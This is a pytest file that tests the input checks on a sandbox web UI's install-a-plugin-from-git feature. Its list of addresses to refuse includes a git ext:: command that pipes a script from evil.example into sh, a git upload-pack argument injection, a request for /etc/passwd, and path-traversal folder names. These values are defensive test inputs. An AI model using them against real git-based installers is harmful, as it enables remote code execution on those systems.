"""Tests for installing a plugin from a git repository.

A plugin is program code that runs as part of the sandbox, under the same API
keys. So most of what is tested here is what the feature *refuses*: addresses
that name a program rather than a place, folder names that would land
somewhere other than `plugins/`, and requests from anywhere but the computer
the sandbox is running on.

Nothing here reaches the network. The one test that genuinely clones does it
from a repository made in a temp folder, with the address check stood aside
for exactly that call — the check itself is tested separately, and testing it
twice is not the same as testing what it guards.
"""

import subprocess
import sys
from pathlib import Path
from unittest.mock import patch

import pytest

install = sys.modules["_pu_webui_plugin_install"]


def _a_repository(where: Path, contents: dict[str, str]) -> Path:
    """Make a real git repository holding *contents*, and return it."""
    where.mkdir(parents=True)
    for name, text in contents.items():
        (where / name).write_text(text, encoding="utf-8")
    for command in (["init", "-q"], ["add", "-A"],
                    ["-c", "user.email=t@t", "-c", "user.name=t",
                     "commit", "-qm", "first"]):
        subprocess.run(["git", *command], cwd=where, check=True, capture_output=True)
    return where


A_PLUGIN = {"plugin.py": (
    'class MyPlugin:\n'
    '    commands = ["summarise", "outline"]\n'
    '    model_roles = {}\n'
    'plugin = MyPlugin()\n'
)}


class TestAddressesItWillNotFetchFrom:
    """git understands addresses that run a program rather than fetch a
    repository. `ext::` is a documented transport that executes what it is
    given; `file://` would reach anything on this computer; an address
    starting with a dash is read by git as a flag."""

    @pytest.mark.parametrize("address", [
        "ext::sh -c 'curl evil.example/x.sh|sh'",
        "file:///etc/passwd",
        "git@github.com:someone/thing.git",
        "ssh://git@example.com/x.git",
        "git://example.com/x.git",
        "--upload-pack=touch /tmp/pwned",
        "-u ext::sh -c whoami",
        "http://github.com/someone/thing",
    ])
    def test_it_is_refused(self, address):
        with pytest.raises(install.InstallError):
            install.check_repository(address)

    def test_an_ordinary_address_is_accepted(self):
        address = "https://github.com/someone/their-plugin.git"
        assert install.check_repository(address) == address

    def test_nothing_typed_says_so(self):
        with pytest.raises(install.InstallError, match="Type the address"):
            install.check_repository("   ")


class TestFolderNamesItWillNotUse:
    """The name decides where the plugin lands, so it has to be a name and
    nothing else."""

    @pytest.mark.parametrize("name", [
        "../../src", "..", "../plugins", "a/b", "a\\b", ".hidden",
        "_private", "with space", "", "  ", "webui/../../src",
    ])
    def test_it_is_refused(self, name, tmp_path):
        with pytest.raises(install.InstallError):
            install.check_folder_name(name, tmp_path)

    def test_an_ordinary_name_lands_inside_plugins(self, tmp_path):
        got = install.check_folder_name("translation-ea", tmp_path)
        assert got == tmp_path / "translation-ea"
        assert got.parent == tmp_path

    def test_a_name_already_taken_is_refused(self, tmp_path):
        (tmp_path / "taken").mkdir()
        with pytest.raises(install.InstallError, match="already a folder"):
            install.check_folder_name("taken", tmp_path)


class TestTheNameItSuggests:

    @pytest.mark.parametrize("address,expected", [
        ("https://github.com/JHGFD82/translation-ea.git", "translation-ea"),
        ("https://github.com/JHGFD82/translation-ea", "translation-ea"),
        ("https://github.com/JHGFD82/translation-ea/", "translation-ea"),
        ("https://gitlab.example.edu/team/My_Plugin.git", "My_Plugin"),
    ])
    def test_it_is_the_repository_name(self, address, expected):
        assert install.suggested_folder_name(address) == expected

    @pytest.mark.parametrize("address", [
        "https://example.com/.git",   # nothing left once .git comes off
        "https://example.com/---",    # nothing left that may start a name
    ])
    def test_it_offers_nothing_rather_than_something_unusable(self, address):
        """An empty box says "type one" far better than a name that will only
        be refused a moment later."""
        assert install.suggested_folder_name(address) == ""

    def test_whatever_it_offers_would_be_accepted(self, tmp_path):
        name = install.suggested_folder_name("https://x.example/a/.weird..name.git")
        if name:
            install.check_folder_name(name, tmp_path)


class TestFetchingOne:

    def _install(self, origin, name, plugins):
        """Fetch from a local repository, standing the address check aside.

        That check refuses file://, which is the whole reason it exists — so
        the only way to exercise everything after it, without the network, is
        to let this one call through. What the check does is tested above.
        """
        with patch.object(install, "check_repository", side_effect=lambda a: a):
            return install.install_from_git(f"file://{origin}", name, plugins)

    def test_a_plugin_arrives_where_it_was_asked_for(self, tmp_path):
        origin = _a_repository(tmp_path / "origin", A_PLUGIN)
        plugins = tmp_path / "plugins"
        plugins.mkdir()
        got = self._install(origin, "myplugin", plugins)
        assert got.name == "myplugin"
        assert (plugins / "myplugin" / "plugin.py").is_file()

    def test_it_says_what_the_plugin_adds(self, tmp_path):
        """Read out of the source, not imported — naming what was fetched is
        for somebody deciding, and importing is how it starts running."""
        origin = _a_repository(tmp_path / "origin", A_PLUGIN)
        plugins = tmp_path / "plugins"
        plugins.mkdir()
        assert self._install(origin, "myplugin", plugins).commands == [
            "summarise", "outline"]

    def test_something_that_is_not_a_plugin_is_not_left_behind(self, tmp_path):
        origin = _a_repository(tmp_path / "origin", {"README.md": "not a plugin"})
        plugins = tmp_path / "plugins"
        plugins.mkdir()
        with pytest.raises(install.InstallError, match="no plugin.py"):
            self._install(origin, "notaplugin", plugins)
        assert list(plugins.iterdir()) == [], "a useless folder was left in plugins"

    def test_a_fetch_that_fails_leaves_nothing(self, tmp_path):
        plugins = tmp_path / "plugins"
        plugins.mkdir()
        with pytest.raises(install.InstallError):
            self._install(tmp_path / "no-such-repository", "nope", plugins)
        assert list(plugins.iterdir()) == []

    def test_git_being_missing_is_said_plainly(self, tmp_path):
        plugins = tmp_path / "plugins"
        plugins.mkdir()
        with patch.object(install.shutil, "which", return_value=None):
            with pytest.raises(install.InstallError, match="git is not installed"):
                install.install_from_git(
                    "https://example.com/x.git", "x", plugins)

    def test_nothing_is_handed_to_a_shell(self, tmp_path):
        """The address comes from a person and goes to a program. It travels
        as one argument in a list, never as part of a command line."""
        plugins = tmp_path / "plugins"
        plugins.mkdir()
        with patch.object(install.subprocess, "run") as ran:
            ran.return_value = subprocess.CompletedProcess([], 1, "", "no")
            with pytest.raises(install.InstallError):
                install.install_from_git("https://example.com/x.git", "x", plugins)
        args, kwargs = ran.call_args
        assert isinstance(args[0], list)
        assert kwargs.get("shell") in (None, False)
        # Everything after -- is a place and a folder, whatever it starts with.
        assert "--" in args[0]
